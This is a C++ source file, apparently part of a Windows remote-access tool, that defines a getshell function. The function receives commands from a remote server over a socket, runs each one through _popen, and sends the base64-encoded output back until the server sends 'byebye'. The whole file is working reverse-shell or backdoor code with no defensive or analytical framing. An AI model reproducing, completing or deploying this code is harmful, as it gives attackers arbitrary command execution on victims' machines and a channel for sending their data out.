#include "BasicHeader.hpp"
#include "base64.hpp"


int getshell(SOCKET sock) {

    char buffer[4096];
    int recvResult;
    // SHELL PART -> should be deattched form main function
    std::string shell_message_base64 = base64_encode("Now in the shell interaction mode");
    send(sock, shell_message_base64.c_str(), shell_message_base64.size(), 0);

    do {
        // Receive server command
        memset(buffer, 0, sizeof(buffer));
        recvResult = recv(sock, buffer, 4096, 0);

        if (std::string(buffer) == "byebye") {
            break;
        }
        if (recvResult > 0) {
            buffer[recvResult] = '\0';  // Add '\0' in the end of string
            std::cout << "Received command from server: " << buffer << std::endl;

            // _popen CMD -> to comunicate with server
            FILE* pipe = _popen(buffer, "r");
            if (!pipe) {
                std::cerr << "Command execution failed." << std::endl;
                break;
            }

            std::string result;
            char temp_buffer[256];
            while (fgets(temp_buffer, sizeof(temp_buffer), pipe) != NULL) {
                result += temp_buffer;
            }
            std::cout << result << std::endl;
            int error_code = _pclose(pipe);
            std::cout << error_code << std::endl;

            // The error command response
            if (error_code != 0) {
                std::cerr << "Command execution failed with error code: " << error_code << std::endl;

                std::string error_message_base64 = base64_encode("Command execution failed. Please retry.");
                send(sock, error_message_base64.c_str(), error_message_base64.size(), 0);
            }
            else {
                std::cout << "Command executed successfully." << std::endl;

                std::string base64_output = base64_encode(result);
                std::cout << "Base64 encoded output: " << base64_output << std::endl;

                // Send result to server
                send(sock, base64_output.c_str(), base64_output.size(), 0);
            }

        }
    } while (recvResult > 0);

    return 1;
}